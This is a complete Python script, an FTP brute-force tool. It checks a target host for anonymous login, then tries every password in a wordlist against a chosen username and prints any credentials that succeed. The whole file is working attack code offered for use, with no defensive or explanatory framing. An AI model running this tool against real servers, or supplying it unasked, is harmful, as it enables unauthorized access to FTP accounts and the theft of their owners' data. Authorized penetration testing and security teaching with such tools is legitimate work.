import ftplib
import sys
import argparse
import time

# Argument parsing
argparser = argparse.ArgumentParser(description='FTP BruteForcer')
argparser.add_argument('--host', help='Host to be bruteforced', required=True)
argparser.add_argument('-u', '--username', help='Username to be bruteforced', default='admin')
argparser.add_argument('-w', '--wordlist', help='Wordlist file', default='passwords.txt')
argparser.add_argument('-t', '--timeout', help='Connection timeout in seconds', type=int, default=5)
argparser.add_argument('-d', '--delay', help='Delay between attempts in seconds', type=float, default=0.5)

args = argparser.parse_args()

# Main variables
host = args.host
username = args.username
wordlist = args.wordlist
timeout = args.timeout
delay = args.delay

# Connection function
def connect(host, user, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, timeout=timeout)
        ftp.login(user=user, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False  # Login failed due to incorrect credentials
    except ftplib.all_errors as e:
        print(f"[-] FTP error: {e}")
        return None  # Return None for connection issues

# Main function
def main():
    print(f"[+] Starting FTP Brute Force on Host: {host} | Username: {username}")

    # Check anonymous login
    if connect(host, 'anonymous', ''):
        print(f"[+] FTP Anonymous login succeeded on host: {host}")
        sys.exit(0)
    else:
        print(f"[-] FTP Anonymous login failed on host: {host}")

    # Validate wordlist file
    try:
        with open(wordlist, 'r') as f:
            passwords = f.read().splitlines()
    except FileNotFoundError:
        print(f"[-] File not found: {wordlist}")
        sys.exit(1)

    # Brute-force loop
    for password in passwords:
        password = password.strip()
        print(f"[*] Testing password: {password}")
        
        result = connect(host, username, password)
        if result:
            print(f"[+] Success! Username: {username} | Password: {password}")
            sys.exit(0)
        elif result is None:
            print(f"[!] Connection issue encountered with host: {host}. Retrying...")
        
        # Delay between attempts
        time.sleep(delay)

    print("[-] Brute force completed. No valid credentials found.")

if __name__ == "__main__":
    main()
